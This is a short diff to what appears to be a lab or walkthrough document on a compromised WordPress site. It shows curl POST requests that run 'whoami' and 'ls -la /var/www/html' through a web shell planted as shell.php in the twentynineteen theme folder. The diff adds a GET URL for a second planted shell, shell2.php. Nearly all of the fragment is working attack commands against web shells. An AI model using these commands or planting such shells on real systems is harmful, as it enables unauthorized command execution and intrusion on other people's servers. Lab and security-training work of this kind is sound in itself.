@@ -345,3 +345,8 @@ curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.p
 curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=whoami"
 curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=ls -la /var/www/html"
 ```
+
+### Browser-accessible shell (GET)
+```url
+http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=whoami
+```
